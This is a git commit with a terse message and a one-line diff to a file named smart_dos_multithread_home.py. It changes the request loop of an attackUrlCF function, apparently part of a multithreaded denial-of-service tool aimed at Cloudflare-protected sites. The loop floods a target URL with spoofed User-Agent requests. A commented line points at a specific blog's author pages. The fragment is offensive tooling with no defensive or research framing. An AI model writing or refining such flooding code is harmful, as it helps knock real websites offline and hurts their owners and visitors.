68ef783b89b4af4be1855679da20af997401b813
blabla <heyholetsgo4@protonmail.com>
2023-01-24 19:56:39 +0200

    'a'

--- smart_dos_multithread_home.py
+++ smart_dos_multithread_home.py
@@ -89,7 +89,7 @@ def attackUrlCF(baseUrl, threadNumber):
 
 	while True:
 		try:
-			url = baseUrl + '/' + ''.join(random.choice(letters) for i in range(10)) 
+			url = baseUrl #+ '/' + ''.join(random.choice(letters) for i in range(10)) 
 			# url = baseUrl + '/author/jimmyaki/page/' + str(random.randint(1,100))
 
 			headers={'User-Agent': userAgent,
